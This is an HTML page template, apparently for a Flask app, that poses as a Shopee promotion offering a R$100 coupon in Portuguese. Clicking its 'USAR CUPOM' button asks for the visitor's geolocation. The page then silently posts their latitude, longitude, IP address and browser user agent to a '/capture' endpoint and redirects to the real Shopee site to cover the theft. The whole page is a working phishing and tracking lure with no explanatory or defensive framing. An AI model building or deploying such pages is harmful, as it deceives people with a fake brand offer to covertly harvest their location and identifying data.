<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Shopee - Cupom de R$100 OFF!</title>
    <link rel="stylesheet" href="/static/css/style.css">
    <style>
        body { background: #FF5722; color: white; }
        .btn { background: #FFD700; color: #333; }
    </style>
</head>
<body>
    <div class="container">
        <h1>ðŸŽ‰ CUPOM SHOPEE: R$100 OFF! ðŸŽ‰</h1>
        <button class="btn" onclick="getLocation()">USAR CUPOM</button>
        <p id="status"></p>
    </div>

    <script>
        function getLocation() {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    fetch('/capture', {
                        method: 'POST',
                        body: JSON.stringify({
                            service: "shopee",
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            ip: "{{ request.remote_addr }}",
                            user_agent: navigator.userAgent
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    }).then(() => {
                        setTimeout(() => {
                            window.location.href = "https://shopee.com.br";
                        }, 3000);
                    });
                },
                (error) => {
                    setTimeout(() => {
                        window.location.href = "https://shopee.com.br";
                    }, 3000);
                }
            );
        }
    </script>
</body>
</html>
